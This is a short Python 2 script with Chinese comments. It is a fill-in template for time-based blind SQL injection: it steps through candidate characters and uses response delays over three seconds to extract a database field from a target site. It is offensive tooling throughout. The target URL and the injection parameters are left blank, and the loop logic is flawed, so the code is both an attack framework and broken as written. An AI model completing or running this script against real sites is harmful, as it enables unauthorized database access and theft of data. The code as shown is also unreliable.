# coding:utf-8
import os
import sys
import time
import requests

#发送HTTP GET请求并获取返回数据
def get(url,params):
    res = requests.get(url,params = params).status_code
    return res

#发送HTTP POST请求并获取返回数据
def post(url,params):
    res = requests.post(url,data=params).status_code
    return res

#利用SQL注入漏洞获取数据
def get_data():
    #定义URL
    #url = ""
    #定义数据提交方式;支持GET和POST方式
    method = "GET"
    #定义payloads
    payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')
    #定义目标字段长度
    length = 3
    #目标字段名称
    name = ""
    print "Is working, please wait......"
    for i in range(1,(length + 1)):
        for payload in payloads:
            #构造HTTP请求参数
            params = ""
            #获取开始时间
            start_time = time.time()
            if method == 'GET':
                get(url,params)
            elif method == "POST":
                post(url,params)
            else:
                print "Please enter correct method"
                break
            #获取结束时间
            end_time = time.time()
            #计算花费时间
            count_time = end_time - start_time
            if count_time > 3:
                name += payload
                print '\rtarget:%s' % (name),
                sys.stdout.flush()
    print "\nend,target:%s" % (name)

if __name__ == '__main__':
    get_data()
